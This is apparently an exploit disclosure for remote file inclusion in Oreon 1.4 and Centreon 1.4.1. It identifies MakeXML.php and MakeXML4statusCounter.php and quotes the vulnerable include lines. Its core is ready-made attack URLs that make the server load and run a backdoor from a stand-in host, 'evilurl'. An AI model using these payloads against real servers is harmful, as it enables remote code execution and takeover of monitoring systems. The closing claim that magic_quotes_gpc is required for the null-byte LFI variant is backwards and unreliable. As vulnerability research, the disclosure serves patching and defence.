Vulnerability Type: Multiple Remote File Inclusion.
Software: Oreon and Centreon
Homepage:http://www.oreon-project.org/  or http://www.centreon.com/
Versions: 1.4(Oreon) and 1.4.1(Centreon)

The vulnerable file is:
./oreon-1.4/www/include/monitoring/engine/MakeXML.php
Another,virtually identical RFI:
./oreon-1.4/www/include/monitoring/engine/MakeXML4statusCounter.php

The attack:
http://127.0.0.1/include/monitoring/engine/MakeXML.php?fileOreonConf=http://evilurl/backdoor.txt?
or
http://127.0.0.1/include/monitoring/engine/MakeXML4statusCounter.php?fileOreonConf=http://evilurl/backdoor.txt?

file MakeXML.php line 42 & 43:
	include_once($oreonPath . "www/oreon.conf.php");
	include_once($oreonPath . "www/include/common/common-Func-ACL.php");

Register_globals isn't needed for the taint:
file MakeXML.php line 28:
	if (isset($_GET["fileOreonConf"]))
		$oreonPath = $_GET["fileOreonConf"];

However magic_quotes_gpc is require for LFI because you need a null byte.

Peace
